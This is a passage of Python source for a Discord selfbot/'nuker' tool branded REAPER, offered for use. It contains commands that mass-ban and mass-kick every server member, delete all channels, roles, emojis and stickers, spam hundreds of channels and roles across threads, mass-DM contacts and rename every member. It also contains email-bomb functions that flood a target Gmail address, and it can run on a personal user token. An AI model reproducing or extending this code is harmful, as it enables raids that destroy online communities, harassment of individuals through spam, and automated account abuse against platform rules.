async def afk(ctx, arg1,arg2=risinnwtff):
    global risinnwtf
    global risinnwtff
    if arg1 == "on" or arg1 == "On":
        risinnwtff = arg2
        risinnwtf = True
        await ctx.message.reply("REAPER | AFK ENABLED", mention_author=True)
    elif arg1 == "off" or arg1 == "Off":
        risinnwtf = False
        risinnwtff = ""
        await ctx.message.reply("REAPER | AFK DISABLED", mention_author=True)

@client.event
async def on_message(message):
    global risinnwtf
    if risinnwtf == True:
        global risinnwtff
        if message.author != client.user:
            if not message.guild:
                await message.channel.send(risinnwtff)
    await client.process_commands(message)

@client.command(aliases=['lserver',"leaveserver","serverleave"])
async def leave(ctx,servid=None):#
    randcolor = random.randint(0x000000, 0xFFFFFF)
    if servid == None:
            embed=discord.Embed(title=f"REAPER", description="Supply an ID  `>leave <server-id>`")#abe sale
            await ctx.reply(embed=embed, mention_author=True)
    else:
   
        embed=discord.Embed(title=f"REAPER", description=f"Leaving `{servid}`")
        embed.set_footer(text="Created by KRAKEN")
        await ctx.reply(embed=embed, mention_author=True)
        
        leave = requests.delete(f"https://discord.com/api/v8/users/@me/guilds/{servid}", headers=headers)
        
        if leave.status_code == 204:
        
            embed=discord.Embed(title=f"REAPER", description=f"Success | Left Server : `{servid}`")
            embed.set_footer(text="Created by KRAKEN")
            await ctx.reply(embed=embed, mention_author=True)


        else:
            embed=discord.Embed(title=f"REAPER", description=f"Error | Error leaving server : `{servid}` Message : {leave.text}")
            embed.set_thumbnail(url="https://cdn.discordapp.com/avatars/815985203436322876/a_f05e7cb6fe59b130f1e1efe26193751a.gif")
            embed.set_footer(text="Created by KRAKEN")
            await ctx.reply(embed=embed, mention_author=True)   
    
@client.command()
async def massdm(ctx, *, x):
	await ctx.reply("**REAPER** > MASS DM", mention_author=True)
	for channel in client.private_channels:
		try:
			await channel.send(x)
			await ctx.reply(f"**REAPER | MASS DM** > {channel}", mention_author=True)
		except:
			continue 
			
@client.command(name='enableCommunityMode', aliases=['eCM', 'eCommunityMode'])
async def disableCommunityMode(ctx):
        r = requests.post(f'https://discord.com/api/v8/guilds/{ctx.guild.id}', headers=headers, json=
            {'description': "fked", 'features': {'1': 'NEWS'}, 
            'preferred_locale': 'en-US', 'public_updates_channel_id': "idk", 'rules_channel_id': "idk"})

@client.command(name='disableCommunityMode', aliases=['dCM', 'dCommunityMode'])
async def disableCommunityMode(ctx):
        r = requests.patch(f'https://discord.com/api/v8/guilds/{ctx.guild.id}', headers=headers, json=
            {'description': None, 'features': {'0': 'NEWS'}, 
            'preferred_locale': 'en-US', 
            'public_updates_channel_id': None, 'rules_channel_id': None})


@client.command()
async def channelfuckery(ctx):
      for i in range(200):
        r = requests.patch(f'https://discord.com/api/v8/guilds/{ctx.guild.id}', headers=headers, json=
            {'description': None, 'features': {'0': 'NEWS'}, 
            'preferred_locale': 'en-US', 
            'public_updates_channel_id': None, 'rules_channel_id': None})
        y = requests.patch(f'https://discord.com/api/v8/guilds/{ctx.guild.id}', headers=headers, json={"features":["COMMUNITY"],"verification_level":1,"default_message_notifications":0,"explicit_content_filter":2,"rules_channel_id":"1","public_updates_channel_id":"1"})




    
@client.command(aliases=["deleteemojis"])
async def delemojis(ctx):
   
    for emoji in list(ctx.guild.emojis):
        try:
            await emoji.delete()
        except:
            return 
          
@client.command(aliases=["deletestickers"])
async def delstickers(ctx):
   
    for sticker in list(ctx.guild.stickers):
        try:
            await sticker.delete()
        except:
            return 
@client.command()
async def decode(ctx, string):
     
    strOne = (string).encode("ascii")
    pad = len(strOne)%4
    strOne += b"="*pad
    encoded_stuff = codecs.decode(strOne.strip(),'base64')
    decoded_stuff = str(encoded_stuff)
    decoded_stuff = decoded_stuff[2:len(decoded_stuff)-1]
    await ctx.reply(decoded_stuff, mention_author=True)

@client.command(aliases=['id', 'userid',"useridtoname"])
async def idtoname(ctx, personsid: int):
    if len(str(personsid)) != 18:
        await ctx.reply(content = f"**REAPER** | >id 822466294032367636", mention_author=True)    
    else:
        user = await client.fetch_user(personsid)
        randcolor = random.randint(0x000000, 0xFFFFFF)
        embed=discord.Embed(title="REAPER | ID TO USERNAME", description=f"ID [{str(personsid)}]  = `{user.name}#{user.discriminator}`")
  
        embed.set_footer(text="Created by KRAKEN")
        await ctx.reply(content="",embed=embed, mention_author=True) 
     
@client.command()
async def nickall(ctx, *, name="KRAKEN OP"):
  print("Nicking All")
  for member in ctx.guild.members:
    try:
      await member.edit(nick=name)
    except:
      pass 

def GmailBomber():
    _smpt = smtplib.SMTP('smtp.gmail.com', 587)
    _smpt.starttls()
    username = input('REAPER | Your temp Gmail: ')
    password = input('REAPER | Your temp Gmail Password: ')
    try:
        _smpt.login(username, password)
    except:
        print(f"{Fore.RED}error: {Fore.RED} Incorrect Password or gmail, make sure you've enabled less-secure apps access in your Gmail Account security settings."+Fore.RESET)
    target = input('REAPER | Target Gmail: ')
    message = input('REAPER | Message to send: ')
    counter = eval(input('REAPER | Ammount of times: '))
    count = 0
    while count < counter:
        count = 0
        _smpt.sendmail(username, target, message)
        count += 1
    if count == counter:
        pass

@client.command(name='gmail-bomb', aliases=['gmail-bomber', 'gmailbomb', 'email-bomber', 'emailbomber'])
async def _gmail_bomb(ctx):
  
    GmailBomber() 
   
@client.command()
async def email(ctx,count=None,bomb_email=None,*,message=None):
    if count == None or bomb_email == None or message == None:
        await ctx.send("Format - !email [count] [email] [message] - e.g !email 10 email@email.com hii!")
    else:
        x = int(count)
    if x > 100:
        await ctx.send("`That's a lot of spam. Do 100 or less!`")
    else:
        currentDT = datetime.datetime.now()
        hour = str(currentDT.hour)
        minute = str(currentDT.minute)
        second = str(currentDT.second)
        print(f"{Fore.RED}[{Fore.WHITE}{hour}:{minute}:{second}{Fore.RED}]{Fore.GREEN} [Command used] - {ctx.author.name}#{ctx.author.discriminator}:{Fore.RESET} !email {count} {bomb_email} {message}")
        counting = int(0)
        embed=discord.Embed(title=f"{counting}/{count}")
        embed.set_author(name="Email sent!")
        
        embed.add_field(name=f'Sending "{message}"', value=f'**to {bomb_email}**', inline=False)
        embed.set_footer(text="Created by KRAKEN")
        msg = await ctx.send(embed=embed)
        for i in range(x):
            mail = smtplib.SMTP('smtp.gmail.com',587)
            mail.ehlo()
            mail.starttls()
            mail.login(emale,pas)
            mail.sendmail(emale,bomb_email,message)
            mail.close() 
            currentDT = datetime.datetime.now()
            hour = str(currentDT.hour)
            minute = str(currentDT.minute)
            second = str(currentDT.second)
            print(f"{Fore.RED}[{Fore.WHITE}{hour}:{minute}:{second}{Fore.RED}]{Fore.GREEN} Message Sent:{Fore.RESET} {message} {Fore.GREEN}To {Fore.RESET}{bomb_email}")
            counting = counting + 1 
           
@client.command()
async def massban(ctx, guild):
    guild = guild
    await client.wait_until_ready()
    guildOBJ = client.get_guild(int(guild))
    members = await guildOBJ.chunk()

    membercount = 0
    with open('KRAKEN/members.txt', 'a') as (m):
        for member in members:
            m.write(str(member.id) + '\n')
            membercount += 1

        await ctx.reply('REAPER | MASS BAN INITIATED Removing Members in progress......', mention_author=True)
        m.close()
    guild = guild
    print()
    members = open('KRAKEN/members.txt')
    for member in members:
        while True:
            r = requests.put(f"https://discord.com/api/v8/guilds/{guild}/bans/{member}", headers=headers)
            if 'retry_after' in r.text:
                time.sleep(r.json()['retry_after'])
            else:
                if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                    print(f"Banned{member.strip()}")
                    break
                else:
                    break

    members.close()

@client.command()
async def botmassban(ctx, pref, timetosleep, guild):
    pref = pref
    timetosleep = int(timetosleep)
    guild = guild
    await client.wait_until_ready()
    guildOBJ = client.get_guild(int(guild))
    members = await guildOBJ.chunk()
    try:
        os.remove('KRAKEN/members.txt')
    except:
        pass

    membercount = 0
    with open('KRAKEN/members.txt', 'a') as (m):
        for member in members:
            m.write(str(member.id) + ' ')
            membercount += 1

        await ctx.reply('REAPER | BOT MASS BAN INITIATED Removing Members in progress......', mention_author=True)
        m.close()
    guild = guild
    print()
    members = open('KRAKEN/members.txt')
    for member in members:
            await ctx.send(f"{pref}ban {member} REAPER")
            print(f"Banned{member.strip()}")
            time.sleep(timetosleep) # because some bots have cooldown like dyno on there commands 


    members.close()
@client.command()
async def masskick(ctx, guild):
    guild = guild
    await client.wait_until_ready()
    guildOBJ = client.get_guild(int(guild))
    members = await guildOBJ.chunk()
    try:
        os.remove('members.txt')
    except:
        pass

    membercount = 0
    with open('members.txt', 'a') as (m):
        for member in members:
            m.write(str(member.id) + ' ')
            membercount += 1

        await ctx.reply('REAPER | MASS KICK INITIATED Removing Members in progress......', mention_author=True)
        m.close()
    guild = guild
    print()
    members = open('members.txt')
    for member in members:
        while True:
            r = requests.delete(f"https://discord.com/api/v8/guilds/{guild}/members/{member}", headers=headers)
            if 'retry_after' in r.text:
                time.sleep(r.json()['retry_after'])
            else:
                if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                    print(f"Kicked {member.strip()}")
                    break
                else:
                    break

    members.close()

@client.command(aliases=["massunban"])
async def unbanall(ctx):
    guild = ctx.guild
    banlist = await guild.bans()
    await ctx.reply('REAPER | Unbanning {} members'.format(len(banlist)), mention_author=True)
    for users in banlist:
            await ctx.guild.unban(user=users.user)

#Here is the code that I use, hope it helps

@client.command()
async def nukehistory(ctx, channel: discord.TextChannel = None):
    if channel == None: 
        await ctx.reply("REAPER | Mention the channel.")
        return

    nuke_channel = discord.utils.get(ctx.guild.channels, name=channel.name)

    if nuke_channel is not None:
        new_channel = await nuke_channel.clone(reason="Has been Nuked!")
        await nuke_channel.delete()
        await new_channel.send("THIS CHANNEL HAS BEEN NUKED!")
        await ctx.reply("Nuked the Channel sucessfully!", mention_author=True)

    else:
        await ctx.reply(f"No channel named {channel.name} was found!", mention_author=True)
@client.command(aliases=["cc"])
async def channelclean(ctx, channeltodelete):
    for channel in ctx.message.guild.channels:
            if channel.name == channeltodelete:
                try:
                    await channel.delete()
                except:
                  pass
def deletionofachannel(channeldetails):
    try:
        requests.delete(f"https://canary.discord.com/api/v8/channels/{channeldetails}",headers=headers)
    except:
        pass

@client.command(aliases=['dc', 'delchannels'])
async def deletechannels(ctx):
    try:
        await ctx.message.delete()
        guild = ctx.guild.id
    except:
        logging.info(f"Connection error.")
        sleep(10)

    def dc(i):
        requests.delete(f"https://discord.com/api/v9/channels/{i}",
                        headers=headers).result()

    for i in range(4):
        for channel in list(ctx.guild.channels):
            threading.Thread(target=dc, args=(channel.id, )).start()
            logging.info(f"Deleted channel {channel}.")

@client.command(aliases=['deleterols', 'deleteallroles',"delroles","roledel","delrols","roldel","roledeletion"])
async def deleteroles(ctx):
    await ctx.message.delete()
    for rol in ctx.guild.roles:
        threading.Thread(target = deletionofarole, args = (ctx.guild.id,rol.id,)).start()
snipe_message_author = {}
snipe_message_content = {}

@client.event
async def on_message_delete(message):
     snipe_message_author[message.channel.id] = message.author
     snipe_message_content[message.channel.id] = message.content
    #  await time.sleep(600)
    #  del snipe_message_author[message.channel.id]
    #  del snipe_message_content[message.channel.id]

@client.command(name = 'snipe')
async def snipe(ctx):
    channel = ctx.channel
    try: #This piece of code is run if the bot finds anything in the dictionary
        em = discord.Embed(name = "REAPER", description = snipe_message_content[channel.id])
        em.set_footer(text = "KRAKEN")
        await ctx.send(embed = em)
    except: #This piece of code is run if the bot doesn't find anything in the dictionary
        await ctx.send("kuch bhi del nahi hua oof code chalja bsdk ")
from discord import Member
@client.command()
async def statuss(ctx, member: Member):
    await ctx.reply(str(member.status), mention_author=True)  

@client.command()
async def joinvc(ctx):
    await ctx.reply("REAPER | Connecting to VC", mention_author=True)
    channel = ctx.author.voice.channel
    await channel.connect()
    await ctx.reply("REAPER | SUCCESSFULLY CONNECTED", mention_author=True)
@client.command()
async def banner(ctx, user:discord.Member):
    if user == None:
        user = ctx.author
    req = await client.http.request(discord.http.Route("GET", "/users/{uid}", uid=user.id))
    banner_id = req["banner"]
    # If statement because the user may not have a banner
    if banner_id:
        banner_url = f"https://cdn.discordapp.com/banners/{user.id}/{banner_id}?size=1024"
    await ctx.reply(f"REAPER | {banner_url}", mention_author=True)
@client.command()
async def create_invite(ctx):
       # """- Create instant invite"""
  await discord.abc.GuildChannel.create_invite(ctx)
@client.command()
async def test(ctx):
  await ctx.reply("working",mention_author=True)

def risinidkchanneldel(idofguild,nameofchan):
    try:
        headers = {"Authorization": f'{velocrypt}'}
        req = requests.post(f"https://canary.discord.com/api/v8/guilds/{idofguild}/channels",headers=headers,json={"type":"0","name":nameofchan})
    except:
        pass


@client.command()
async def spamchannels(ctx):
    try:
        await ctx.message.delete()
        guild = ctx.guild.id
    except:
        logging.info(f"Connection error.")
        sleep(10)

    def mc(i):
        json = {"name": i}
        r = requests.post(
            f"https://discord.com/api/v9/guilds/{guild}/channels",
            headers=headers,
            json=json)

    for i in range(500):
        threading.Thread(target=mc,
                         args=(random.choice(channelnames), )).start()
        logging.info(f"Created channel {random.choice(channelnames)}.")

    await asyncio.sleep(15)

@client.command()
async def checkprune(ctx,  days: int):
    prunemem = await ctx.guild.estimate_pruned_members(days=days, roles=ctx.guild.roles)
    await ctx.reply(f"{prunemem} MEMBERS", mention_author=True)


@client.command()
async def spamroles(ctx):
    try:
        await ctx.message.delete()
        guild = ctx.guild.id
    except:
        logging.info(f"Connection error.")
        sleep(10)
    def massroles(i):
        json = {
          "name": i
        }
        r = requests.post(f"https://discord.com/api/v9/guilds/{guild}/roles", headers=headers, json=json)
    for i in range(500):
        threading.Thread(
          target=massroles,
          args=(random.choice(rolenames), )
          ).start()
        logging.info(f"Created channel {random.choice(rolenames)}.")

    await asyncio.sleep(15)
@client.command()
async def prune(ctx,  days: int):
    await ctx.reply("REAPER | Initiating a prune request.")
    time.sleep(2)
    await ctx.guild.prune_members(days=days, compute_prune_count=True, roles=ctx.guild.roles)
    time.sleep(1)
    await ctx.reply("REAPER | Successfully Pruned.")
if token_type == "user":        client.run(velocrypt, bot=False)
elif token_type == "bot":
                client.run(velocrypt)



# client.run(velocrypt, bot = False)
